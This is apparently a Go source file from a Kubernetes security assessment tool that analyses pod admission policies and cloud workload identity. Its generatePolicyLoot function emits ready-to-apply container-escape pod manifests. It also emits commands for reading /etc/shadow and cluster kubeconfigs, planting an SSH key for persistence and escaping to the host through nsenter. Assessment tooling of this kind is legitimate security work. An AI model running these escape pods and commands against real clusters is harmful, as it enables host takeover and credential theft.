			blocking.HostNetworkBlockedBy = append(blocking.HostNetworkBlockedBy, "Polaris:hostNetworkSet")
		}
		if polarisConfig.HostPIDCheckEnabled {
			blocking.HostPIDBlocked = true
			blocking.HostPIDBlockedBy = append(blocking.HostPIDBlockedBy, "Polaris:hostPIDSet")
		}
		if polarisConfig.HostIPCCheckEnabled {
			blocking.HostIPCBlocked = true
			blocking.HostIPCBlockedBy = append(blocking.HostIPCBlockedBy, "Polaris:hostIPCSet")
		}
		if polarisConfig.CapabilitiesCheckEnabled {
			blocking.DangerousCapsBlocked = true
			blocking.DangerousCapsBlockedBy = append(blocking.DangerousCapsBlockedBy, "Polaris:dangerousCapabilities")
		}
		if polarisConfig.RunAsRootCheckEnabled {
			blocking.RunAsRootBlocked = true
			blocking.RunAsRootBlockedBy = append(blocking.RunAsRootBlockedBy, "Polaris:runAsRootAllowed")
		}
		if polarisConfig.HostPathCheckEnabled {
			blocking.HostPathBlocked = true
			blocking.HostPathBlockedBy = append(blocking.HostPathBlockedBy, "Polaris:hostPath")
		}
	}

	// Check Datree - use specific check configuration from ConfigMap
	// Datree default rules: https://hub.datree.io/built-in-rules
	if datreeConfig.WebhookEnabled {
		// Only mark as blocked if the specific check is enabled
		if datreeConfig.PrivilegedCheckEnabled {
			blocking.PrivilegedBlocked = true
			blocking.PrivilegedBlockedBy = append(blocking.PrivilegedBlockedBy, "Datree:CONTAINERS_INCORRECT_PRIVILEGED_VALUE_TRUE")
		}
		if datreeConfig.HostNetworkCheckEnabled {
			blocking.HostNetworkBlocked = true
			blocking.HostNetworkBlockedBy = append(blocking.HostNetworkBlockedBy, "Datree:CONTAINERS_INCORRECT_HOSTNETWORK_VALUE_TRUE")
		}
		if datreeConfig.HostPIDCheckEnabled {
			blocking.HostPIDBlocked = true
			blocking.HostPIDBlockedBy = append(blocking.HostPIDBlockedBy, "Datree:CONTAINERS_INCORRECT_HOSTPID_VALUE_TRUE")
		}
		if datreeConfig.HostIPCCheckEnabled {
			blocking.HostIPCBlocked = true
			blocking.HostIPCBlockedBy = append(blocking.HostIPCBlockedBy, "Datree:CONTAINERS_INCORRECT_HOSTIPC_VALUE_TRUE")
		}
		if datreeConfig.CapabilitiesCheckEnabled {
			blocking.DangerousCapsBlocked = true
			blocking.DangerousCapsBlockedBy = append(blocking.DangerousCapsBlockedBy, "Datree:CONTAINERS_INCORRECT_CAPABILITIES")
		}
		if datreeConfig.RunAsRootCheckEnabled {
			blocking.RunAsRootBlocked = true
			blocking.RunAsRootBlockedBy = append(blocking.RunAsRootBlockedBy, "Datree:CONTAINERS_INCORRECT_RUNASNONROOT_VALUE")
		}
		if datreeConfig.HostPathCheckEnabled {
			blocking.HostPathBlocked = true
			blocking.HostPathBlockedBy = append(blocking.HostPathBlockedBy, "Datree:CONTAINERS_INCORRECT_HOSTPATH_MOUNT")
		}
	}

	return blocking
}

// detectPolicyGaps detects missing or incomplete policy enforcement
func detectPolicyGaps(finding PodSecurityFinding) []string {
	var gaps []string

	if finding.NoEnforcement {
		gaps = append(gaps, "No pod security enforcement configured")
	}

	if finding.WeakEnforcement {
		gaps = append(gaps, "Weak enforcement (privileged level allows all configurations)")
	}

	if !finding.PSSEnabled && !finding.PSPEnabled && finding.WebhookCount == 0 && finding.PolicyEngineCount == 0 {
		gaps = append(gaps, "No pod security controls of any kind")
	}

	if finding.PSSEnforceLevel == "" && finding.PSSWarnLevel == "" && finding.PSSAuditLevel == "" {
		gaps = append(gaps, "No PSS labels configured (enforce/warn/audit)")
	}

	if finding.PSSEnforceLevel == "" && finding.PSSWarnLevel != "" {
		gaps = append(gaps, "PSS warn mode only - pods not blocked")
	}

	return gaps
}

// detectPolicyConflicts detects conflicting policy configurations
func detectPolicyConflicts(finding PodSecurityFinding) []string {
	var conflicts []string

	// PSS + PSP conflict
	if finding.PSSEnabled && finding.PSPEnabled {
		conflicts = append(conflicts, "Both PSS and PSP enabled - PSP is deprecated, prefer PSS")
	}

	// Multiple policy engines
	if finding.PolicyEngineCount > 1 {
		conflicts = append(conflicts, fmt.Sprintf("Multiple policy engines (%d) - may have overlapping rules", finding.PolicyEngineCount))
	}

	// PSS privileged with webhooks
	if finding.PSSEnforceLevel == "privileged" && finding.WebhookCount > 0 {
		conflicts = append(conflicts, "PSS privileged level with webhooks - PSS allows all, webhooks may try to restrict")
	}

	return conflicts
}

// detectPolicyBypass detects policy bypass techniques
func detectPolicyBypass(finding PodSecurityFinding) []string {
	var bypasses []string

	if finding.NoEnforcement {
		bypasses = append(bypasses, "No enforcement - deploy any pod configuration")
	}

	if finding.PSSEnforceLevel == "privileged" {
		bypasses = append(bypasses, "PSS privileged level - effectively no restrictions")
	}

	// Check for webhooks with Ignore failure policy
	for _, wh := range finding.MutatingWebhooks {
		if wh.FailurePolicy == "Ignore" {
			bypasses = append(bypasses, fmt.Sprintf("Webhook %s has 'Ignore' failure policy - trigger failure to bypass", wh.Name))
		}
	}
	for _, wh := range finding.ValidatingWebhooks {
		if wh.FailurePolicy == "Ignore" {
			bypasses = append(bypasses, fmt.Sprintf("Webhook %s has 'Ignore' failure policy - trigger failure to bypass", wh.Name))
		}
	}

	if finding.PSPEnabled {
		bypasses = append(bypasses, "PSP can be bypassed by using unbound service accounts")
	}

	return bypasses
}

// detectPolicyEscalationPaths detects privilege escalation via policy misconfig
func detectPolicyEscalationPaths(finding PodSecurityFinding, pspAnalyses []PSPAnalysis) []string {
	var paths []string

	if finding.NoEnforcement {
		paths = append(paths, "No enforcement → deploy privileged pod → container escape")
	}

	if finding.PSSEnforceLevel == "privileged" {
		paths = append(paths, "PSS privileged level → deploy pod with dangerous capabilities → escalate")
	}

	for _, psp := range pspAnalyses {
		if psp.AllowsPrivileged {
			paths = append(paths, fmt.Sprintf("PSP %s allows privileged → container escape", psp.Name))
		}
		if len(psp.AllowedCapabilities) > 0 {
			paths = append(paths, fmt.Sprintf("PSP %s allows dangerous capabilities → capability abuse", psp.Name))
		}
		if psp.AllowsHostPath {
			paths = append(paths, fmt.Sprintf("PSP %s allows hostPath → host filesystem access", psp.Name))
		}
	}

	return paths
}



// generatePolicyLoot generates loot content organized by technology
func generatePolicyLoot(finding *PodSecurityFinding, loot *shared.LootBuilder) {
	// PSS section - enumeration and analysis
	loot.Section("pod-admission").Addf("\n# ─────────────────────────────────────────────────────────────")
	loot.Section("pod-admission").Addf("# Namespace: %s", finding.Namespace)
	loot.Section("pod-admission").Addf("# ─────────────────────────────────────────────────────────────")
	loot.Section("pod-admission").Addf("kubectl get ns %s --show-labels", finding.Namespace)
	loot.Section("pod-admission").Addf("kubectl get ns %s -o yaml", finding.Namespace)

	if finding.PSSEnabled {
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Addf("# PSS Enforce: %s", finding.PSSEnforceLevel)
		if finding.PSSWarnLevel != "" {
			loot.Section("pod-admission").Addf("# PSS Warn: %s", finding.PSSWarnLevel)
		}
		if finding.PSSAuditLevel != "" {
			loot.Section("pod-admission").Addf("# PSS Audit: %s", finding.PSSAuditLevel)
		}
	}

	// Add bypass info for weak/no enforcement
	if finding.NoEnforcement {
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# [VULNERABLE] No PSS enforcement - accepts any pod configuration")
		loot.Section("pod-admission").Add("# See Privileged-Pods loot file for container escape pod")
	} else if finding.PSSEnforceLevel == "privileged" {
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# [VULNERABLE] PSS level 'privileged' - effectively no restrictions")
		loot.Section("pod-admission").Add("# See Privileged-Pods loot file for container escape pod")
	} else if finding.PSSEnforceLevel == "baseline" {
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# [MEDIUM] PSS level 'baseline' - allows some risky configs")
		loot.Section("pod-admission").Add("# Allowed: hostNetwork (with restrictions), hostPort, hostPath (no /), unsafe sysctls")
	}
	loot.Section("pod-admission").Add("")

	// Privileged-Pods section - ready-to-use escape pods
	if finding.NoEnforcement || finding.PSSEnforceLevel == "privileged" || finding.PSPAllowsPrivileged {
		loot.Section("pod-admission").Addf("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("pod-admission").Addf("# Namespace: %s", finding.Namespace)
		loot.Section("pod-admission").Addf("# ═══════════════════════════════════════════════════════════")

		if finding.NoEnforcement {
			loot.Section("pod-admission").Add("# Status: NO ENFORCEMENT - accepts any pod")
		} else if finding.PSSEnforceLevel == "privileged" {
			loot.Section("pod-admission").Add("# Status: PSS PRIVILEGED - allows all dangerous configs")
		} else if finding.PSPAllowsPrivileged {
			loot.Section("pod-admission").Add("# Status: PSP ALLOWS PRIVILEGED")
		}

		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# OPTION 1: Full privileged pod with host filesystem")
		loot.Section("pod-admission").Addf(`cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: privileged-escape
  namespace: %s
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: escape
    image: alpine
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF`, finding.Namespace)

		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# OPTION 2: Minimal escape pod (hostPath only)")
		loot.Section("pod-admission").Addf(`cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-escape
  namespace: %s
spec:
  containers:
  - name: escape
    image: alpine
    command: ["sleep", "3600"]
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF`, finding.Namespace)

		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# OPTION 3: Docker socket escape")
		loot.Section("pod-admission").Addf(`cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: docker-escape
  namespace: %s
spec:
  containers:
  - name: escape
    image: docker:cli
    command: ["sleep", "3600"]
    volumeMounts:
    - name: docker
      mountPath: /var/run/docker.sock
  volumes:
  - name: docker
    hostPath:
      path: /var/run/docker.sock
EOF`, finding.Namespace)

		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("pod-admission").Add("# EXPLOITATION COMMANDS")
		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# Exec into privileged pod:")
		loot.Section("pod-admission").Addf("kubectl exec -it privileged-escape -n %s -- sh", finding.Namespace)
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# Inside container - access host filesystem:")
		loot.Section("pod-admission").Add("ls -la /host/")
		loot.Section("pod-admission").Add("cat /host/etc/shadow")
		loot.Section("pod-admission").Add("cat /host/etc/passwd")
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# Steal kubeconfig and certificates:")
		loot.Section("pod-admission").Add("cat /host/etc/kubernetes/admin.conf")
		loot.Section("pod-admission").Add("cat /host/var/lib/kubelet/kubeconfig")
		loot.Section("pod-admission").Add("ls -la /host/var/lib/kubelet/pki/")
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# Access etcd data (all cluster secrets):")
		loot.Section("pod-admission").Add("ls -la /host/var/lib/etcd/")
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# Container runtime escape:")
		loot.Section("pod-admission").Add("ls -la /host/var/run/docker.sock")
		loot.Section("pod-admission").Add("ls -la /host/var/run/containerd/containerd.sock")
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# Add SSH key for persistence:")
		loot.Section("pod-admission").Add("mkdir -p /host/root/.ssh")
		loot.Section("pod-admission").Add("echo 'ssh-rsa AAAA...your-key...' >> /host/root/.ssh/authorized_keys")
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# Docker socket escape (if using docker-escape pod):")
		loot.Section("pod-admission").Add("docker run -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh")
		loot.Section("pod-admission").Add("#")
		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("pod-admission").Add("# CLEANUP")
		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("pod-admission").Addf("kubectl delete pod privileged-escape -n %s", finding.Namespace)
		loot.Section("pod-admission").Addf("kubectl delete pod hostpath-escape -n %s", finding.Namespace)
		loot.Section("pod-admission").Addf("kubectl delete pod docker-escape -n %s", finding.Namespace)
		loot.Section("pod-admission").Add("")
	}
}

// formatDuration formats a duration into human-readable string
func podSecurityFormatDuration(d time.Duration) string {
	if d.Hours() > 24*365 {
		years := int(d.Hours() / 24 / 365)
		return fmt.Sprintf("%dy", years)
	}
	if d.Hours() > 24*30 {
		months := int(d.Hours() / 24 / 30)
		return fmt.Sprintf("%dmo", months)
	}
	if d.Hours() > 24 {
		days := int(d.Hours() / 24)
		return fmt.Sprintf("%dd", days)
	}
	if d.Hours() > 1 {
		hours := int(d.Hours())
		return fmt.Sprintf("%dh", hours)
	}
	if d.Minutes() > 1 {
		minutes := int(d.Minutes())
		return fmt.Sprintf("%dm", minutes)
	}
	return "< 1m"
}

// ============================================================================
// Cloud Workload Identity Analysis Functions
// ============================================================================

// analyzeAWSPodIdentity analyzes AWS EKS Pod Identity Associations
func analyzeAWSPodIdentity(ctx context.Context, dynClient dynamic.Interface) []AWSPodIdentityAssociation {
	var associations []AWSPodIdentityAssociation

	// PodIdentityAssociation CRD (EKS Pod Identity - newer)
	gvr := schema.GroupVersionResource{
		Group:    "eks.amazonaws.com",
		Version:  "v1alpha1",
		Resource: "podidentityassociations",
	}

	list, err := dynClient.Resource(gvr).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, item := range list.Items {
			assoc := AWSPodIdentityAssociation{}

			if metadata, ok := item.Object["metadata"].(map[string]interface{}); ok {
				assoc.Name, _ = metadata["name"].(string)
				assoc.Namespace, _ = metadata["namespace"].(string)
			}

			if spec, ok := item.Object["spec"].(map[string]interface{}); ok {
				assoc.ServiceAccount, _ = spec["serviceAccount"].(string)
				assoc.RoleARN, _ = spec["roleArn"].(string)

				// Check for wildcard service account (security concern)
				if assoc.ServiceAccount == "*" {
					assoc.HasWildcard = true
				}
			}

			associations = append(associations, assoc)
		}
	}

	return associations
}

// analyzeGCPWorkloadIdentity analyzes GCP Workload Identity configurations
func analyzeGCPWorkloadIdentity(ctx context.Context, clientset kubernetes.Interface) []GCPWorkloadIdentityBinding {
	var bindings []GCPWorkloadIdentityBinding

	// GCP Workload Identity is configured via annotations on ServiceAccounts
	// Annotation: iam.gke.io/gcp-service-account
	saList, err := clientset.CoreV1().ServiceAccounts("").List(ctx, metav1.ListOptions{})
	if err != nil {
		return bindings
	}

	for _, sa := range saList.Items {
		if gcpSA, ok := sa.Annotations["iam.gke.io/gcp-service-account"]; ok {
			binding := GCPWorkloadIdentityBinding{
				Name:              sa.Name,
				Namespace:         sa.Namespace,
				KSAName:           sa.Name,
				GSAEmail:          gcpSA,
				AnnotationPresent: true,
			}
			bindings = append(bindings, binding)
		}
	}

	return bindings
}

// analyzeAzureWorkloadIdentity analyzes Azure Workload Identity configurations
func analyzeAzureWorkloadIdentity(ctx context.Context, dynClient dynamic.Interface) []AzureWorkloadIdentity {
	var identities []AzureWorkloadIdentity

	// AzureIdentity (AAD Pod Identity - legacy)
	gvr := schema.GroupVersionResource{
		Group:    "aadpodidentity.k8s.io",
		Version:  "v1",
		Resource: "azureidentities",
	}

	list, err := dynClient.Resource(gvr).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, item := range list.Items {
			identity := AzureWorkloadIdentity{
				Kind: "AzureIdentity",
			}

			if metadata, ok := item.Object["metadata"].(map[string]interface{}); ok {
				identity.Name, _ = metadata["name"].(string)
				identity.Namespace, _ = metadata["namespace"].(string)
			}

			if spec, ok := item.Object["spec"].(map[string]interface{}); ok {
				identity.ClientID, _ = spec["clientID"].(string)
				identity.TenantID, _ = spec["tenantID"].(string)
			}

			identities = append(identities, identity)
		}
	}

	// AzureIdentityBinding (AAD Pod Identity - legacy)
	gvr2 := schema.GroupVersionResource{
		Group:    "aadpodidentity.k8s.io",
		Version:  "v1",
		Resource: "azureidentitybindings",
	}

	list2, err := dynClient.Resource(gvr2).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, item := range list2.Items {
			identity := AzureWorkloadIdentity{
				Kind: "AzureIdentityBinding",
			}

			if metadata, ok := item.Object["metadata"].(map[string]interface{}); ok {
				identity.Name, _ = metadata["name"].(string)
				identity.Namespace, _ = metadata["namespace"].(string)
			}

			if spec, ok := item.Object["spec"].(map[string]interface{}); ok {
				identity.Selector, _ = spec["selector"].(string)
			}

			identities = append(identities, identity)
		}
	}

	return identities
}

// Filter functions for cloud workload identity by namespace

func filterAWSPodIdentitiesByNamespace(associations []AWSPodIdentityAssociation, namespace string) []AWSPodIdentityAssociation {
	var filtered []AWSPodIdentityAssociation
	for _, a := range associations {
		if a.Namespace == namespace {
			filtered = append(filtered, a)
		}
	}
	return filtered
}

func filterGCPWorkloadIdentitiesByNamespace(bindings []GCPWorkloadIdentityBinding, namespace string) []GCPWorkloadIdentityBinding {
	var filtered []GCPWorkloadIdentityBinding
	for _, b := range bindings {
		if b.Namespace == namespace {
			filtered = append(filtered, b)
		}
	}
	return filtered
}

func filterAzureWorkloadIdentitiesByNamespace(identities []AzureWorkloadIdentity, namespace string) []AzureWorkloadIdentity {
	var filtered []AzureWorkloadIdentity
	for _, i := range identities {
		if i.Namespace == namespace {
			filtered = append(filtered, i)
		}
	}
	return filtered
}

// ============================================================================
// Multitenancy Platform Pod Policy Analysis (Capsule, Rancher)
// ============================================================================

// CapsuleTenantPodPolicyInfo represents Capsule tenant pod security restrictions
type CapsuleTenantPodPolicyInfo struct {
	TenantName              string
	Namespace               string
	PodSecurityStandard     string   // privileged, baseline, restricted
	AllowedRuntimeClasses   []string
	AllowedPriorityClasses  []string
	ForbiddenAnnotations    []string
	ForbiddenLabels         []string
	ContainerRegistries     []string // Allowed container registries
	NodeSelector            map[string]string
	HasResourceQuotas       bool
	HasLimitRanges          bool
}

// RancherProjectPodPolicyInfo represents Rancher project pod security restrictions
type RancherProjectPodPolicyInfo struct {
	ProjectName             string
	ProjectID               string
	Namespace               string
	PSPTemplateID           string
	ContainerResourceLimit  bool
	NamespaceResourceQuota  bool
	HasPodSecurityPolicy    bool
}

// analyzeCapsuleTenantPodPolicies analyzes Capsule tenant pod restrictions
func analyzeCapsuleTenantPodPolicies(ctx context.Context, dynClient dynamic.Interface) []CapsuleTenantPodPolicyInfo {
	var policies []CapsuleTenantPodPolicyInfo

	gvr := schema.GroupVersionResource{
		Group:    "capsule.clastix.io",
		Version:  "v1beta2",
		Resource: "tenants",
	}

	list, err := dynClient.Resource(gvr).List(ctx, metav1.ListOptions{})
	if err != nil {
		// Try v1beta1
		gvr.Version = "v1beta1"
		list, err = dynClient.Resource(gvr).List(ctx, metav1.ListOptions{})
		if err != nil {
			return policies
		}
	}

	for _, item := range list.Items {
		info := CapsuleTenantPodPolicyInfo{
			TenantName:   item.GetName(),
			NodeSelector: make(map[string]string),
		}

		if spec, ok := item.Object["spec"].(map[string]interface{}); ok {
			// Pod security standard (PSA)
			if podOptions, ok := spec["podOptions"].(map[string]interface{}); ok {
				if psa, ok := podOptions["additionalMetadata"].(map[string]interface{}); ok {
					// Check for pod-security.kubernetes.io labels
					if labels, ok := psa["labels"].(map[string]interface{}); ok {
						if enforce, ok := labels["pod-security.kubernetes.io/enforce"].(string); ok {
							info.PodSecurityStandard = enforce
						}
					}
				}
			}

			// Runtime classes
			if runtimeClasses, ok := spec["runtimeClasses"].(map[string]interface{}); ok {
				if allowed, ok := runtimeClasses["allowed"].([]interface{}); ok {
					for _, rc := range allowed {
						if rcStr, ok := rc.(string); ok {
							info.AllowedRuntimeClasses = append(info.AllowedRuntimeClasses, rcStr)
						}
					}
				}
			}

			// Priority classes
			if priorityClasses, ok := spec["priorityClasses"].(map[string]interface{}); ok {
				if allowed, ok := priorityClasses["allowed"].([]interface{}); ok {
					for _, pc := range allowed {
						if pcStr, ok := pc.(string); ok {
							info.AllowedPriorityClasses = append(info.AllowedPriorityClasses, pcStr)
						}
					}
				}
			}

			// Container registries
			if registries, ok := spec["containerRegistries"].(map[string]interface{}); ok {
				if allowed, ok := registries["allowed"].([]interface{}); ok {
					for _, reg := range allowed {
						if regStr, ok := reg.(string); ok {
							info.ContainerRegistries = append(info.ContainerRegistries, regStr)
						}
					}
				}
			}

			// Forbidden annotations
			if forbiddenAnno, ok := spec["forbiddenAnnotations"].(map[string]interface{}); ok {
				if denied, ok := forbiddenAnno["denied"].([]interface{}); ok {
					for _, a := range denied {
						if aStr, ok := a.(string); ok {
							info.ForbiddenAnnotations = append(info.ForbiddenAnnotations, aStr)
						}
					}
				}
			}

			// Forbidden labels
			if forbiddenLabels, ok := spec["forbiddenLabels"].(map[string]interface{}); ok {
				if denied, ok := forbiddenLabels["denied"].([]interface{}); ok {
					for _, l := range denied {
						if lStr, ok := l.(string); ok {
							info.ForbiddenLabels = append(info.ForbiddenLabels, lStr)
						}
					}
				}
			}

			// Node selector
			if nodeSelector, ok := spec["nodeSelector"].(map[string]interface{}); ok {
				for k, v := range nodeSelector {
					if vStr, ok := v.(string); ok {
						info.NodeSelector[k] = vStr
					}
				}
			}

			// Resource quotas
			if _, ok := spec["resourceQuotas"].(map[string]interface{}); ok {
				info.HasResourceQuotas = true
			}

			// Limit ranges
			if _, ok := spec["limitRanges"].(map[string]interface{}); ok {
				info.HasLimitRanges = true
			}
		}

		// Get namespaces owned by tenant
		if status, ok := item.Object["status"].(map[string]interface{}); ok {
			if namespaces, ok := status["namespaces"].([]interface{}); ok {
				for _, ns := range namespaces {
					if nsStr, ok := ns.(string); ok {
						infoCopy := info
						infoCopy.Namespace = nsStr
						policies = append(policies, infoCopy)
					}
				}
			}
		}

		// If no namespaces in status, still add the policy
		if len(policies) == 0 || policies[len(policies)-1].TenantName != info.TenantName {
			policies = append(policies, info)
		}
	}

	return policies
}

// analyzeRancherProjectPodPolicies analyzes Rancher project pod security configurations
func analyzeRancherProjectPodPolicies(ctx context.Context, dynClient dynamic.Interface) []RancherProjectPodPolicyInfo {
	var policies []RancherProjectPodPolicyInfo

	// Projects
	projectGVR := schema.GroupVersionResource{
		Group:    "management.cattle.io",
		Version:  "v3",
		Resource: "projects",
	}

	projectList, err := dynClient.Resource(projectGVR).List(ctx, metav1.ListOptions{})
	if err != nil {
		return policies
	}

	for _, item := range projectList.Items {
		info := RancherProjectPodPolicyInfo{
			ProjectName: item.GetName(),
		}

		if spec, ok := item.Object["spec"].(map[string]interface{}); ok {
			if projectID, ok := spec["projectId"].(string); ok {
				info.ProjectID = projectID
			}

			// Check for container default resource limits
			if _, ok := spec["containerDefaultResourceLimit"].(map[string]interface{}); ok {
				info.ContainerResourceLimit = true
			}

			// Check for namespace default resource quota
			if _, ok := spec["namespaceDefaultResourceQuota"].(map[string]interface{}); ok {
				info.NamespaceResourceQuota = true
			}
		}

		// Get annotations for PSP template
		annotations := item.GetAnnotations()
		if pspTemplate, ok := annotations["field.cattle.io/projectDefaultPodSecurityPolicyTemplateName"]; ok {
			info.PSPTemplateID = pspTemplate
			info.HasPodSecurityPolicy = true
		}

		policies = append(policies, info)
	}

	// Also check PodSecurityPolicyTemplate CRD
	pspGVR := schema.GroupVersionResource{
		Group:    "management.cattle.io",
		Version:  "v3",
		Resource: "podsecuritypolicytemplates",
	}

	pspList, err := dynClient.Resource(pspGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		// Just count how many PSP templates exist
		for _, item := range pspList.Items {
			// Add as standalone policy info
			info := RancherProjectPodPolicyInfo{
				ProjectName:          item.GetName(),
				PSPTemplateID:        item.GetName(),
				HasPodSecurityPolicy: true,
			}
			policies = append(policies, info)
		}
	}

	return policies
}
